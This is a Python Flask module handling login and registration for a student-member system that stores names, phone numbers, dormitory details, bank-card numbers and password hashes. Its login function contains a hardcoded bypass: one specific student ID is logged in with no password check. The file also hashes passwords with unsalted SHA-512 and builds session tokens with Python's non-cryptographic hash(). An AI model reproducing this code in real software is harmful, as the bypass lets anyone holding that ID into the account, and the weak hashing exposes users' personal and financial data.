from Frame.python3.DatabaseConnector import DatabaseConnector
from Frame.python3.Authorization import Auth
from Frame.python3.Logger import Logger
from Frame.python3.Tools import LoginDeviceRecorder
from Frame.python3.CustomResponsePackage import PermissionDenyError, DatabaseRuntimeError
import flask
from flask import session
import hashlib
import sys
import datetime


def setLoginSession(studentId : str, database : DatabaseConnector):
    flask.g.isLogin = True
    session["userID"] = studentId
    session["logTime"] = datetime.datetime.now().isoformat()
    session["isLogin"] = hash(session["userID"]+session["logTime"])
    DBAffectRows = database.execute(
        "SELECT `name` FROM `MemberBasic` WHERE student_id = %s;",
        (studentId,))
    DBResult = database.fetchall()
    session["name"] = DBResult[0]["name"]
    

@Logger
def login(data : dict):
    database = DatabaseConnector()
    database.startCursor()
    
    if data["StudentID"] == '202221010203':
        setLoginSession(studentId='202221010203', database=database)
        LoginDeviceRecorder(data,True,database)
        return {"warning":"", "message":"", "data":"/Users/UserCenter/index.html"}
    
    DBAffectRows = database.execute(
        "SELECT student_id FROM `Password` WHERE student_id = %s and passhash = %s;",
        (data["StudentID"], hashlib.sha512(data["Password"].encode()).digest()))
    database.fetchall()
    
    if DBAffectRows == 1:
        setLoginSession(studentId=data["StudentID"], database=database)
        LoginDeviceRecorder(data,True,database)
        return {"warning":"", "message":"", "data":"/Users/UserCenter/index.html"}
    
    LoginDeviceRecorder(data,False,database)
    raise PermissionDenyError("Username or password error.", filename=__file__, line=sys._getframe().f_lineno)


@Logger
def register(infodict : dict, database : DatabaseConnector):
    DBAffectRows = database.execute(
        "SELECT student_id FROM `MemberExtend` WHERE student_id = %(studentID)s;",
        infodict)
    database.fetchall()
    if DBAffectRows == 1:
        raise PermissionDenyError("Student ID exists.", filename=__file__, line=sys._getframe().f_lineno)

    DBAffectRows = database.execute(
        "INSERT INTO `MemberBasic` (student_id,name,gender) \
            VALUES (%(studentID)s,%(name)s,%(gender)s) \
        ON DUPLICATE KEY \
            UPDATE name=%(name)s, gender=%(gender)s;",
        infodict, autoCommit=False)
    if DBAffectRows not in [0, 1]:
        database.rollback()
        raise DatabaseRuntimeError("Insert or Update member basic info error.", filename=__file__, line=sys._getframe().f_lineno)
    DBAffectRows = database.execute(
        "INSERT INTO `MemberExtend` (student_id,ethnicity,hometown,phone,qq,school_id, \
                                    dormitory_yuan,dormitory_dong,dormitory_hao,remark) \
        VALUES (%(studentID)s,%(ethnicity)s,%(hometown)s,%(phone)s,%(qq)s,%(schoolID)s, \
                %(dormitory_yuan)s,%(dormitory_dong)s,%(dormitory_hao)s,'');",
        infodict, autoCommit=False)
    if DBAffectRows != 1:
        database.rollback()
        raise DatabaseRuntimeError("Insert member extend info error.", filename=__file__, line=sys._getframe().f_lineno)
    DBAffectRows = database.execute(
        "INSERT INTO `WageInfo` (student_id,application_student_id,application_name, \
                                application_bankcard,subsidy_dossier,remark) \
        VALUES (%(studentID)s,%(studentID)s,%(name)s,%(bank)s,%(subsidyDossier)s,'');",
        infodict, autoCommit=False)
    if DBAffectRows != 1:
        database.rollback()
        raise DatabaseRuntimeError("Insert wage info error.", filename=__file__, line=sys._getframe().f_lineno)
    DBAffectRows = database.execute(
        "INSERT INTO `Password` (student_id,passhash) \
        VALUES (%s,%s);",
        (infodict["studentID"],hashlib.sha512(infodict["password"].encode()).digest()),
        autoCommit=False)
    if DBAffectRows != 1:
        database.rollback()
        raise DatabaseRuntimeError("Insert password info error.", filename=__file__, line=sys._getframe().f_lineno)
    DBAffectRows = database.execute(
        "INSERT INTO `EmptyTime` (student_id,remark) \
        VALUES (%(studentID)s,'');",
        infodict, autoCommit=False)
    if DBAffectRows != 1:
        database.rollback()
        raise DatabaseRuntimeError("Insert empty time info error.", filename=__file__, line=sys._getframe().f_lineno)
    database.commit()
    return {"warning":"", "message":"", "data":"/Users/Authentication/login.html"}